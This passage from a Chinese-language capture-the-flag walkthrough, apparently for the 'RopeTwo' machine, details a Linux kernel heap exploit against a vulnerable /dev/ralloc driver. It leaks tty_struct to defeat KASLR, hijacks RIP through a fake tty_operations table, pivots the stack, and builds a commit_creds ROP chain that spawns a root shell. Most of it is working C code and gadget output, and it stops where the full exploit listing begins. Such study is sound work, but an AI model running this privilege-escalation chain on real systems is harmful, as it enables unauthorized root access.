reading into next buffer</span><br></pre></td></tr></table></figure>

<h2 id="KASLR-Defeat"><a href="#KASLR-Defeat" class="headerlink" title="KASLR Defeat"></a>KASLR Defeat</h2><h3 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h3><p>利用内核堆的一种常用技术是找到tty_struct。可以稍后使用它来执行，但首先将使用它来泄漏一个地址，这个地址与内核基的常量偏移量相等。将使用&#x2F;dev&#x2F;ptmx创建它，这是一个<span class="exturl" data-url="aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi80L3B0bXg=">伪终端设备<i class="fa fa-external-link-alt"></i></span>。有很多文章展示了利用这一点的好例子，比如<span class="exturl" data-url="aHR0cHM6Ly9jaGFuZ29jaGVuLmdpdGh1Yi5pby8yMDE4LTAyLTA3LXNoYXJpZjguaHRtbA==">这个<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9oYWNrbWQuaW8vQHB0ci15dWRhaS9ySnAxVHBiQlU=">这个<i class="fa fa-external-link-alt"></i></span>。</p>
<p>其思想是，创建一个新的缓冲区，然后立即打开&#x2F;dev&#x2F;ptmx，它将为tty_struct分配一个0x2e0字节的内核缓冲区，希望紧接在缓冲区之后。因为可以读取0x20字节超出缓冲区的结束，希望将能够读取到结构，它有以下格式:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct tty_struct &#123;</span><br><span class="line">	int	magic;</span><br><span class="line">	struct kref kref;</span><br><span class="line">	struct device *dev;</span><br><span class="line">	struct tty_driver *driver;</span><br><span class="line">	const struct tty_operations *ops;</span><br><span class="line">	/* ...... */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目标是读取tty_operations指针，因为它指向ptm_unix98_ops，它与内核基的偏移量是恒定的。第一个尝试是使用TTY_MAGIC<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmh1aWhvby5jb20vZG94eWdlbi9saW51eC9rZXJuZWwvMy43L2luY2x1ZGVfMmxpbnV4XzJ0dHlfOGhfc291cmNlLmh0bWw=">定义为<i class="fa fa-external-link-alt"></i></span>0x5401这一事实来检查是否设法读取正确的结构体。但是，内存中有多个tty_struct，当查看调试器时，它会发现其他的tty_struct不指向ptm_unix98_ops。</p>
<p>可以在gdb中查看ptm_unix98_ops的当前地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p &amp;ptm_unix98_ops</span><br><span class="line"><span class="variable">$1</span> = (const struct tty_operations *) 0xffffffff820af6a0</span><br><span class="line">&lt;ptm_unix98_ops&gt;</span><br></pre></td></tr></table></figure>

<p>虽然顶部的地址会随着KASLR而改变，但底部的三颗不会改变。因此，将寻找magic和最后三个字节，期望tty_operations。</p>
<p>要找到从ptm_unix98_ops到内核基的偏移量，将查看&#x2F;proc&#x2F;kallsyms。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ropetest:~<span class="comment"># cat /proc/kallsyms | grep &#x27; startup_64&#x27;</span></span><br><span class="line">ffffffff94a00000 T startup_64</span><br></pre></td></tr></table></figure>

<p>所以偏移量是:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p 0xffffffff95aaf6a0 - 0xffffffff94a00000</span><br><span class="line"><span class="variable">$1</span> = 0x10af6a0</span><br></pre></td></tr></table></figure>

<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>下面的代码将清除所有缓冲区槽。然后，它将尝试最多32次来分配缓冲区，然后立即打开&#x2F;dev&#x2F;ptmx.然后，它将执行越界读取，查找tty_operations的magic和正确的低三个字节。在找到它时，它将中断并打印:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc) &#123;</span><br><span class="line">    int i;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ralloc&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == -1) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Failed to open /dev/ralloc&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">        delete_buf(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint64_t *output = malloc(0x420);</span><br><span class="line">    <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">        create_buf(i, 0x400);</span><br><span class="line">        int ptmx = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"></span><br><span class="line">        read_buf(1, 0x420, output);</span><br><span class="line">        <span class="keyword">if</span>((output[<span class="number">0</span>x400/<span class="number">8</span>] &amp; <span class="number">0</span>xffffffff) == <span class="number">0</span>x5401 &amp;&amp;</span><br><span class="line">           (output[<span class="number">0</span>x418/<span class="number">8</span>] &amp; <span class="number">0</span>xfff) == <span class="number">0</span>x6a0) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;[-]Failed to find tty_struct, retrying [%<span class="number">02</span>x]\n&quot;, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (i == <span class="number">0</span>x20)&#123;</span><br><span class="line">        printf(&quot;Failed to find tty_struct. Try again\n&quot;);</span><br><span class="line">        exit(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=<span class="number">0</span>x400/<span class="number">8</span>; i &lt; <span class="number">0</span>x420/<span class="number">8</span>; i++)&#123;</span><br><span class="line">        printf(&quot;<span class="number">0</span>x%<span class="number">03</span>x: %<span class="number">016</span>lx\n&quot;, i*<span class="number">8</span>, output[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有时它什么也找不到，但很多时候它能找到:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:~$ /tmp/n</span><br><span class="line">[-]Failed to find tty_struct, retrying [00]</span><br><span class="line">[-]Failed to find tty_struct, retrying [01]</span><br><span class="line">[-]Failed to find tty_struct, retrying [02]</span><br><span class="line">0x400: 0000000100005401 &lt;-- magic</span><br><span class="line">0x408: 0000000000000000</span><br><span class="line">0x410: ffff9880ead25600</span><br><span class="line">0x418: ffffffff95aaf6a0 &lt;-- tty_operations</span><br></pre></td></tr></table></figure>

<p>现在把它重构成一个循环，这样它就会继续尝试，如果它达到32，仍然没有找到它:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc) &#123;</span><br><span class="line"></span><br><span class="line">    int i, <span class="built_in">id</span>;</span><br><span class="line">    uint64_t *output = malloc(0x420);</span><br><span class="line">    uint64_t kernel_base;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ralloc&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == -1) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Failed to open /dev/ralloc&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = 0;</span><br><span class="line">    <span class="keyword">while</span>(kernel_base == 0) &#123;</span><br><span class="line">        // Clear buffers</span><br><span class="line">        <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">            delete_buf(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Loop over buffers, create, open ptmx, check <span class="keyword">for</span> tty_struct</span><br><span class="line">        <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">            create_buf(i, 0x400);</span><br><span class="line">            ptmx = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"></span><br><span class="line">            read_buf(i, 0x420, output);</span><br><span class="line">            <span class="keyword">if</span>((output[<span class="number">0</span>x400/<span class="number">8</span>] &amp; <span class="number">0</span>xffffffff) == <span class="number">0</span>x5401 &amp;&amp;</span><br><span class="line">               (output[<span class="number">0</span>x418/<span class="number">8</span>] &amp; <span class="number">0</span>xfff) == <span class="number">0</span>x6a0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            close(ptmx);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (i == <span class="number">0</span>x20)&#123;</span><br><span class="line">            printf(&quot;[-] Failed to find tty_struct. Try again.\n&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint64_t ptm_unix98_ops = output[<span class="number">0</span>x418/<span class="number">8</span>];</span><br><span class="line">            printf(&quot;[+] Identified ptm_unix98_ops address: %<span class="number">016</span>lx\n&quot;, ptm_unix98_ops);</span><br><span class="line">            kernel_base = ptm_unix98_ops - <span class="number">0</span>x10af6a0;</span><br><span class="line">            printf(&quot;[+] Identified kernel base address:    %<span class="number">016</span>lx\n&quot;, kernel_base);</span><br><span class="line">            id = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有效:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ropetest:~$ ./exploit</span><br><span class="line">[-] Failed to find tty_struct. Try again.</span><br><span class="line">[-] Failed to find tty_struct. Try again.</span><br><span class="line">[+] Identified ptm_unix98_ops address: ffffffff95aaf6a0</span><br><span class="line">[+] Identified kernel base address:    ffffffff94a00000</span><br></pre></td></tr></table></figure>

<h2 id="控制RIP"><a href="#控制RIP" class="headerlink" title="控制RIP"></a>控制RIP</h2><h3 id="策略-1"><a href="#策略-1" class="headerlink" title="策略"></a>策略</h3><p>既然能打败KASLR，就试着控制RIP。为了做到这一点，将继续滥用tty_struct，特别是用来获得泄漏的tty_operations结构体。这个结构体的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvcnZhbGRzL2xpbnV4L2Jsb2IvbWFzdGVyL2luY2x1ZGUvbGludXgvdHR5X2RyaXZlci5o">结构如下<i class="fa fa-external-link-alt"></i></span>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct tty_operations &#123;</span><br><span class="line">	struct tty_struct * (*lookup)(struct tty_driver *driver,</span><br><span class="line">			struct file *filp, int idx);</span><br><span class="line">	int  (*install)(struct tty_driver *driver, struct tty_struct *<span class="built_in">tty</span>);</span><br><span class="line">	void (*remove)(struct tty_driver *driver, struct tty_struct *<span class="built_in">tty</span>);</span><br><span class="line">	int  (*open)(struct tty_struct * <span class="built_in">tty</span>, struct file * filp);</span><br><span class="line">	void (*close)(struct tty_struct * <span class="built_in">tty</span>, struct file * filp);</span><br><span class="line">	void (*shutdown)(struct tty_struct *<span class="built_in">tty</span>);</span><br><span class="line">	void (*cleanup)(struct tty_struct *<span class="built_in">tty</span>);</span><br><span class="line">	int  (*write)(struct tty_struct * <span class="built_in">tty</span>,</span><br><span class="line">		      const unsigned char *buf, int count);</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>它包含了一堆指向函数的指针，这些函数将被用于各种操作。因此，当设备句柄上调用close时，close操作在这个结构体中查找。因此，如果能控制这个，就能控制RIP。</p>
<h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>现在可以控制一个指向tty_operations结构体的指针。将创建一个新的，然后用自己的指针覆盖那个指针。要担心的唯一函数是close()，因为将在插入伪tty_operations之后立即关闭TTY的句柄。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint64_t *fake_tty_ops = malloc(248);</span><br><span class="line">fake_tty_ops[4] = 0xdfdfdfdfdfdfdfdf;</span><br><span class="line">output[0x418/8] = (uint64_t)fake_tty_ops;</span><br><span class="line">write_buf(<span class="built_in">id</span>, 0x420, output);</span><br><span class="line">close(ptmx);</span><br></pre></td></tr></table></figure>

<p>因为RIP现在是0xdfdfdfdfdfdfdfdf，所以会导致系统崩溃。</p>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="堆栈中枢"><a href="#堆栈中枢" class="headerlink" title="堆栈中枢"></a>堆栈中枢</h3><p>控制了RIP，需要运行一些东西。当想到一个典型的ROP时，栈上有一个被覆盖的返回地址，然后ROP可以在此之后继续。在这种情况下，覆盖是tty_operations结构体中的一个指针，所以不能一直写在那里，因为那不是堆栈。这就引出了<span class="exturl" data-url="aHR0cHM6Ly9mYWlsaW5nc2lsZW50bHkud29yZHByZXNzLmNvbS8yMDE4LzA0LzE3L3doYXQtaXMtYS1zdGFjay1waXZvdC8=">堆栈枢轴<i class="fa fa-external-link-alt"></i></span>的概念，即使用一个gadget将堆栈移动到已经或将要写入rop链攻击的新地址。可以将堆栈移动到控制的内存空间，并在那里建立一个ROP链。</p>
<p>因为在寻找贯穿整个内核的gadgets，所以会有很多。将使用ROPGadget将它们全部转储到一个文件中(这将花费一分钟)，然后可以从那里搜索它。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># python3 /opt/ROPgadget/ROPgadget.py --binary vmlinux-5.0.0-38-generic &gt; gadgets </span></span><br><span class="line">root@kali<span class="comment"># wc -l gadgets </span></span><br><span class="line">811057 gadgets</span><br></pre></td></tr></table></figure>

<p>可以在崩溃中看到对close()的覆盖在RIP和RAX中结束。因此，虽然很难在堆栈上得到一些东西，以弹出到RSP，一个xchg RSP, rax将把堆栈在一个知道的地址。而且由于代码在内核中运行，在更改权限和覆盖内容方面有相当大的灵活性。</p>
<p>使用grep寻找xchg与RSP和RAX没有找到任何东西。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># grep -E -e &#x27;xchg rsp, rax ; ret&#x27; -e &#x27;xchg rax, rsp ; ret&#x27; gadgets</span></span><br></pre></td></tr></table></figure>

<p>但是因为可以预测单词的前32位，EAX和ESP也可以，还有很多这样的单词:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># grep -E -e &#x27;: xchg esp, eax ; ret&#x27; -e &#x27;: xchg eax, esp ; ret&#x27; gadgets | wc -l</span></span><br><span class="line">228</span><br></pre></td></tr></table></figure>

<p>因为将使它成为堆栈指针，所以需要gadgets的地址位于8位边界上。还很多:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># grep -E -e &#x27;: xchg esp, eax ; ret&#x27; -e &#x27;: xchg eax, esp ; ret&#x27; gadgets | grep -E &quot;^0x[0-9a-f]&#123;15&#125;[08]&quot; | wc -l</span></span><br><span class="line">38</span><br><span class="line">root@kali<span class="comment"># grep -E -e &#x27;: xchg esp, eax ; ret&#x27; -e &#x27;: xchg eax, esp ; ret&#x27; gadgets | grep -E &quot;^0x[0-9a-f]&#123;15&#125;[08]&quot; | head</span></span><br><span class="line">0xffffffff81368c08 : xchg eax, esp ; ret 0</span><br><span class="line">0xffffffff817fccd8 : xchg eax, esp ; ret 0x166</span><br><span class="line">0xffffffff81610650 : xchg eax, esp ; ret 0x2241</span><br><span class="line">0xffffffff81076088 : xchg eax, esp ; ret 0x35e9</span><br><span class="line">0xffffffff81288d78 : xchg eax, esp ; ret 0x3948</span><br><span class="line">0xffffffff8114bb88 : xchg eax, esp ; ret 0x394d</span><br><span class="line">0xffffffff812f74c0 : xchg eax, esp ; ret 0x3d</span><br><span class="line">0xffffffff828deb28 : xchg eax, esp ; ret 0x43</span><br><span class="line">0xffffffff814afc90 : xchg eax, esp ; ret 0x69e9</span><br><span class="line">0xffffffff8154b090 : xchg eax, esp ; ret 0x8148</span><br></pre></td></tr></table></figure>

<p>将获取第一个，现在代码看起来像:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// Stack Pivot</span><br><span class="line">size_t xchg_esp_eax = 0x368c08 + kernel_base;</span><br><span class="line">uint64_t *fake_tty_ops = malloc(248);</span><br><span class="line">fake_tty_ops[4] = xchg_esp_eax;</span><br><span class="line">output[0x83] = (uint64_t)fake_tty_ops;</span><br><span class="line">write_buf(<span class="built_in">id</span>, 0x420, output);</span><br><span class="line">uint64_t new_stack = xchg_esp_eax &amp; 0xffffffff;</span><br><span class="line"></span><br><span class="line">// Set Permissions</span><br><span class="line"></span><br><span class="line">// Offsets</span><br><span class="line"></span><br><span class="line">// ROP</span><br><span class="line"></span><br><span class="line">// trigger ROP</span><br><span class="line">close(ptmx);</span><br></pre></td></tr></table></figure>

<p>带有32位参数的xchg指令将0清除64位寄存器的其余部分。因此，新的堆栈不会在xchg指令的顶部，而是在相同的位置，但前32位为空。</p>
<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>在内核中，有很多控制权，但是内存需要同时是可写的和可执行的，所以将调用mmap。调用需要在页面边界上，因此将最后三个小块设置为0，并选择一个足够大的大小，以便ROP不担心空间问题。<span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuMi9tbWFwLjIuaHRtbA==">文档<i class="fa fa-external-link-alt"></i></span>在这里显示了标记，将选择MAP_PRIVATE，因为希望这个更改只影响这个进程，MAP_ANONYMOUS，因为在这里使用shellcode, MAP_FIXED，因为希望强制地址。对于MAP_ANONYMOUS, fd参数应该是-1，并且没有偏移量:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Set Permissions</span><br><span class="line">mmap((void *)(new_stack &amp; <span class="number">0</span>xfffff000), <span class="number">0</span>x1000, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">    MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">// Offsets</span><br><span class="line"></span><br><span class="line">// ROP</span><br><span class="line"></span><br><span class="line">// trigger ROP</span><br><span class="line">close(ptmx);</span><br></pre></td></tr></table></figure>

<h3 id="ROP-1"><a href="#ROP-1" class="headerlink" title="ROP"></a>ROP</h3><p>ROP本身将使用一种技术，将prepare_kernel_cred(0)传递给commit_creds，以将当前进程设置为root。然后返回到用户空间，使用swapgs生成shell，并使用shell生成函数。</p>
<p>将定义需要使用的偏移量(未显示)，然后转到ROP。首先，将返回(使用ret gadget开始ROP总是好的)，然后调用prepare_kernel_cred(0):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// ROP</span><br><span class="line">uint64_t *st_ptr = new_stack;</span><br><span class="line">int st_idx = 0;</span><br><span class="line">st_ptr[st_idx++] = ret;</span><br><span class="line">st_ptr[st_idx++] = pop_rdi;</span><br><span class="line">st_ptr[st_idx++] = 0;</span><br><span class="line">st_ptr[st_idx++] = prepare_kernel_cred;</span><br></pre></td></tr></table></figure>

<p>返回时，结果将以RAX的形式出现，需要一种方法将其导入RDI。mov rdi, rdx gadget并不漂亮:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># grep &#x27;: mov rdi, rax&#x27; gadgets | grep -v -e call -e &#x27;jmp 0x&#x27;</span></span><br><span class="line">0xffffffff8112e597 : mov rdi, rax ; cmp r8, rdx ; jne 0xffffffff8112e57c ; pop rbp ; ret</span><br><span class="line">0xffffffff814ed7ea : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff814ed7dd ; pop rbp ; ret</span><br><span class="line">0xffffffff814ed84c : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff814ed83d ; pop rbp ; ret</span><br><span class="line">0xffffffff8102f7ff : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; pop rbp ; ret</span><br><span class="line">0xffffffff828f29f4 : mov rdi, rax ; xor eax, eax ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret</span><br><span class="line"></span><br><span class="line">root@kali<span class="comment"># grep &#x27;: pop r8 ; ret&#x27; gadgets | head -1</span></span><br><span class="line">0xffffffff814875b2 : pop r8 ; ret</span><br><span class="line">root@kali<span class="comment"># grep &#x27;: pop rdx ; ret&#x27; gadgets | head -1</span></span><br><span class="line">0xffffffff8103bbc2 : pop rdx ; ret</span><br></pre></td></tr></table></figure>

<p>看看列表中的第一个，只要R8等于RDX，它就会跳过跳转，弹出RBP，然后返回。可以做到:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">st_ptr[st_idx++] = pop_r8;</span><br><span class="line">st_ptr[st_idx++] = 0;</span><br><span class="line">st_ptr[st_idx++] = pop_rdx;</span><br><span class="line">st_ptr[st_idx++] = 0;</span><br><span class="line">st_ptr[st_idx++] = mov_rax_rdi_cmp_pop_rbp;</span><br><span class="line">st_ptr[st_idx++] = 0;</span><br><span class="line">st_ptr[st_idx++] = commit_creds;</span><br></pre></td></tr></table></figure>

<p>代码将把0放到R8和RDX中，然后调用gadget将返回值从RAX移动到RDI，然后是RBP pop的最后一个0。然后，RDI包含来自prepare_kernel_cred的返回值，它调用commit_creds。</p>
<p>现在，creds已经到位，需要代码来返回用户区。首先，swapgs将用它在用户空间中运行所需的值交换内核的GS基寄存器。有一个带有swapgs和pop rbp的gadget可以工作:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">st_ptr[st_idx++] = swapgs_pop_rbp;</span><br><span class="line">st_ptr[st_idx++] = 0;</span><br></pre></td></tr></table></figure>

<p>然后sysretq指令将返回到useland。这通常用于从<span class="exturl" data-url="aHR0cDovL3d3dy5pamFjay5vcmcudWsvc3lzY2FsbHMuaHRtbA==">系统调用返回<i class="fa fa-external-link-alt"></i></span>。需要在RCX中设置返回地址，并在R11中设置标志。将写一个简短的函数，想跳转到作为root:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void <span class="function"><span class="title">shell</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        puts(<span class="string">&quot;[-] Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>R11中的内容似乎并不重要，所以将使用0。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">st_ptr[st_idx++] = pop_rcx;</span><br><span class="line">st_ptr[st_idx++] = &amp;shell;</span><br><span class="line">st_ptr[st_idx++] = pop_r11;</span><br><span class="line">st_ptr[st_idx++] = 0x0;</span><br><span class="line">st_ptr[st_idx++] = sysretq;</span><br></pre></td></tr></table></figure>

<h3 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h3><p>现在剩下要做的就是通过关闭&#x2F;dev&#x2F;ptmx.的句柄来触发ROP这应该会导致在这个进程中运行&#x2F;bin&#x2F;sh，但如果失败，将打印一条消息并返回1:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// trigger ROP</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering ROP\n&quot;</span>);</span><br><span class="line">close(ptmx);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] Exploit failed.\n&quot;</span>);</span><br><span class="line"><span class="built_in">return</span> 1;</span><br></pre></td></tr></table></figure>

<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>完整的exp源码在这里。对于所有的代码片段，将编译并上传到RopeTwo机器:</p>
<ul>
<li>exploit.c</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 